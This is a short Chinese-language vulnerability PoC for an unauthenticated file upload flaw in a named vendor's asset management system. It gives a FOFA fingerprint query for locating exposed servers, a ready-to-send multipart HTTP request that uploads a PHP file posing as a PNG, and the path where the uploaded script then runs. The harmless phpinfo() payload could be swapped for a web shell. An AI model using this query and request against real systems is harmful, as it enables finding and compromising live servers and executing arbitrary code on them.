# 资产管理运营系统mobilefront2前台文件上传漏洞
湖南众合百易信息技术有限公司（简称：百易云）成立于2017年是一家专注于不动产领域数字化研发及服务的国家高新技术企业，公司拥有不动产领域的数字化全面解决方案、覆盖住宅、写字楼、商业中心、专业市场、产业园区、公建、后勤等多种业态、通过数字化帮助企业实现数字化转型，有效提高公司管理水平及业务办理效率、降低运营成本，公司自成立以来，已帮助众多企业实现数字化转型。资产管理运营系统mobilefront2前台文件上传漏洞

# fofa
```javascript
body="media/css/uniform.default.css" && body="资管云"
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1721891230963-ab71a358-6ed2-4ca8-9c97-c78fd2421899.png)

## poc
```java
POST /mobilefront/c/2.php HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Length: 35827

-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file1"; filename="1.php"
Content-Type: image/png

<?php phpinfo();?>
-----------------------------289666258334735365651210512949--
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1725009158273-6ced2659-9820-4f50-bc55-55e18fd6b2d5.png)

```java
/mobilefront/c/images2/17250090851.php
```

![](https://cdn.nlark.com/yuque/0/2024/png/1622799/1725009187757-3a3a5fd4-f025-4ce9-9fa6-1834f403cb61.png)

